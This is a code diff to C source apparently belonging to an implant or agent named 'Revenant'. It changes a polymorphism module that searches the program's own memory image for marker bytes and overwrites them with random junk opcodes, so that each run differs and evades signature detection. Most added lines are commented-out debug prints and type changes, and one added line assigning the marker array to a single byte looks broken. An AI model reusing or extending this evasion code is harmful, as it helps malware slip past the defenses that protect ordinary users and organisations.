@@ -7,6 +7,7 @@
 #include "Revenant.h"
 #include "Strings.h"
 #include "Obfuscation.h"
+#include "Utilities.h"
 #include "Defs.h"
 
 #include <tchar.h>
@@ -14,6 +15,7 @@
 #if CONFIG_POLYMORPHIC == TRUE
 
 INT morphModule() {
+    //_tprintf("MORPHMODULE 17\n");
     INT returnValue = 1;
 // Reserved for future functionality
 //#if CONFIG_OBFUSCATION == TRUE
@@ -33,19 +35,21 @@ INT morphModule() {
 
     // Declare the MODULEINFO struct to store module information.
     MODULEINFO modInfo;
-
+    //_tprintf("MORPHMODULE 37\n");
     // Obtain the current process handle.
     HANDLE hProcess = NtCurrentProcess;
 
     // Get a handle to the base module of the current process.
-    HMODULE hModule = GetModuleHandle(NULL);
 
+    HMODULE hModule = GetModuleHandle(NULL);
+    //_tprintf("MORPHMODULE 44\n");
     // If the module information is obtained successfully, enter the loop.
     if (GetModuleInformation(hProcess, hModule, &modInfo, sizeof(MODULEINFO)))
     {
         // Check if module size is less than MAXDWORD.
         if (modInfo.SizeOfImage < MAXDWORD)
         {
+
             // Declare the byte pointer to the last matching pattern and the match offset.
             PBYTE pbyLastMatch = 0;
             DWORD dwMatchOffset = 0;
@@ -54,23 +58,31 @@ INT morphModule() {
             BOOL bMorphingFinished = FALSE;
 
             // Declare a counter for the number of memory regions that have been morphed.
-            DWORD dwRegionCount = 0;
 
-            BYTE markerAddr[MARKER_SIZE] = {0};
+            DWORD dwRegionCount = 0;
+            unsigned char marker_bytes = MARKER_BYTES;
+            unsigned char markerAddr[MARKER_SIZE] = {0};
+            //_tprintf("MORPHMODULE 64\n");
+            //_tprintf("markerADDR 66: %p\n", markerAddr);
+            //__asm("int3");
             mem_cpy(markerAddr,MARKER_BYTES,MARKER_SIZE);
+            //_tprintf("MORPHMODULE 69\n");
 
             // Iterate through memory regions of the current process's module to search for the marker pattern.
             while (!bMorphingFinished)
             {
 
                 // Call the findPattern function to search for the marker pattern in memory.
-                PBYTE startAddr= (PBYTE)modInfo.lpBaseOfDll;
+                PVOID startAddr= (PVOID)modInfo.lpBaseOfDll;
+                //_tprintf("poly 72\n");
                 pbyLastMatch = findPattern(startAddr, modInfo.SizeOfImage, markerAddr, NULL, MARKER_SIZE);
-
+                //_tprintf("poly 74\n");
                 // If the marker pattern is found, replace it with random opcodes and update the offsets.
                 if (pbyLastMatch != NULL)
                 {
+                    //_tprintf("poly 78\n");
                     morphMemory(pbyLastMatch, (BYTE) MARKER_SIZE);
+                    //_tprintf("poly 80\n");
                 }
                     // If the marker pattern is not found, set the morphing status to finished.
                 else
@@ -90,6 +102,7 @@ INT morphModule() {
 
 int morphMemory(PBYTE pbyDst, BYTE byLength)
 {
+
     /*                  *
     *** JUNK CODE ALGO ***
     jmp        or      0x90
@@ -111,6 +124,7 @@ int morphMemory(PBYTE pbyDst, BYTE byLength)
     BYTE byOpcodeIt = 0;
 
     // Determine whether to insert a NOP instruction at the beginning of the opcodes
+
     BOOL bPlaceNop = (rand() % 2) ? TRUE : FALSE;
     if (bPlaceNop)
     {
@@ -140,6 +154,7 @@ int morphMemory(PBYTE pbyDst, BYTE byLength)
 #else
     void *p_ntdll = get_ntdll_32();
 #endif //CONFIG_ARCH
+
     PBYTE pbyMarker = pbyDst;
 
     NTSTATUS status;
@@ -179,8 +194,9 @@ int morphMemory(PBYTE pbyDst, BYTE byLength)
 }
 
 // pszMask reserved for future use
-PBYTE findPattern(PBYTE pData, SIZE_T uDataSize, PBYTE pPattern, PCHAR pszMask, SIZE_T uPatternSize)
+PVOID findPattern(PVOID pData, SIZE_T uDataSize, PVOID pPattern, PCHAR pszMask, SIZE_T uPatternSize)
 {
+
     SIZE_T remainingLen = uDataSize;
     //_tprintf("findPattern!\n");
     while(remainingLen > 0){
@@ -199,6 +215,7 @@ PBYTE findPattern(PBYTE pData, SIZE_T uDataSize, PBYTE pPattern, PCHAR pszMask, 
 
 void morphModule()
 {
+
     return;
 }
 #endif //CONFIG_POLYMORPHIC
